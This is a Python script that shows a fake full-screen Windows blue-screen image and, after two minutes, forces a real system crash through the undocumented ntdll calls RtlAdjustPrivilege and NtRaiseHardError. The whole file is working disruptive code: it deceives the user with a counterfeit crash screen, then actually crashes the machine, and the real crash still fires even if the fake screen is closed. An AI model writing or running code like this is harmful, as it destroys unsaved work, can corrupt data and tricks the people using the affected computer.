import tkinter as tk
from PIL import Image, ImageTk
import ctypes
import threading

# Function to trigger a real BSOD
def trigger_real_bsod():
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000001, 0, 0, None, 6, ctypes.byref(ctypes.c_ulong()))

# Function to create a fake BSOD using an image
def fake_bsod_with_image(bsod_image_path):
    def on_close():
        root.destroy()

    def timeout():
        root.after(120000, trigger_real_bsod)  # Trigger the real BSOD after 2 minutes

    # Create the root window
    root = tk.Tk()
    root.overrideredirect(True)  # Remove window decorations

    # Get screen width and height
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    # Set the window size to fullscreen manually
    root.geometry(f"{screen_width}x{screen_height}+0+0")

    # Load the BSOD image
    image = Image.open(bsod_image_path)
    image = image.resize((screen_width, screen_height), Image.Resampling.LANCZOS)  # Resize to fit screen
    photo = ImageTk.PhotoImage(image)

    # Add the image to a label and pack it fullscreen
    label = tk.Label(root, image=photo)
    label.pack(fill="both", expand=True)

    # Bind Alt+F4 to close the fake BSOD
    root.bind("<Alt-F4>", lambda event: on_close())

    # Start the timeout thread
    threading.Thread(target=timeout, daemon=True).start()

    root.mainloop()

# Call the fake BSOD function with your image path
fake_bsod_with_image("bsod.jpg")
